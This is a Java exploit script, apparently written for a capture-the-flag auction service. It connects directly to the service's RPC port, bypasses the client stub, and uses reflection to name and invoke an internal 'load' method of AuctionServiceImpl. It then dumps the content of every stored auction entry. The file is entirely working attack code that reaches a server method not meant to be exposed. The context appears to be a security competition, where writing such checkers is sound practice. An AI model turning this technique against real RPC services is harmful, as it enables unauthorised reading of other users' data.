package checker;

import de.faust.auction.AuctionServiceImpl;
import de.faust.auction.communication.*;
import de.faust.auction.model.AuctionEntry;

import java.io.IOException;
import java.lang.reflect.Method;
import java.net.Socket;
import java.rmi.NotBoundException;
import java.rmi.server.RMISocketFactory;
import java.util.concurrent.ConcurrentHashMap;
import java.util.logging.Logger;


public class Exploit1 {
    private static final Logger logger = Logger.getLogger(Logger.GLOBAL_LOGGER_NAME);

    public static void main(String[] args) throws IOException, NotBoundException {
        // get command line arguments
        if (args.length < 1) {
            System.err.println("usage: java " + Exploit1.class.getName() + " <serverRegistryHost>");
            return;
        }

        String serverRegistryHost = args[0]; //host name or IP the auction service is running on

        RPCConnection.enableTimeouts();

        //connect directly to the AuctionService's skeleton without using the stub
        Socket socket = RMISocketFactory.getSocketFactory().createSocket(serverRegistryHost, RPCServer.SERVER_PORT);
        RPCObjectConnection objectConnection = new RPCObjectConnection(socket);


        String methodName = "load"; //method that shall be called in AuctionServiceImpl
        //find the method that shall be called
        Method method = null;
        for (Method m : AuctionServiceImpl.class.getDeclaredMethods()) {
            if (m.toGenericString().contains(methodName)) {
                logger.info("Found the method: " + m.toGenericString());
                method = m;
                break;
            }
        }

        if (method == null) {
            logger.info(methodName + " could not be found in the class AuctionServiceImpl or its superclasses.");
            return;
        }

        //call specified method
        String clientID = Utils.randomGuid();
        String rpcID = Utils.randomGuid();
        RPCRequest request = new RPCRequest(0, method.toGenericString(), new Object[0], clientID, rpcID, 0);
        RPCResponse recv = null;
        try {
            objectConnection.sendObject(request);
        } catch (Exception se) {
            logger.info("sendObject: " + se.toString());
        }
        try {
            recv = (RPCResponse) objectConnection.receiveObject();
        } catch (IOException e) {
            logger.info("receiveObject: " + e.toString());
        } catch (ClassNotFoundException e) {
            logger.info("receiveObject: " + e.toString());
        }

        ConcurrentHashMap<String, AuctionEntry> auctions = (ConcurrentHashMap<String, AuctionEntry>) recv.getObject();
        auctions.values().forEach(a -> {
            System.out.println("Content: " + a.getContent());
        });
    }
}
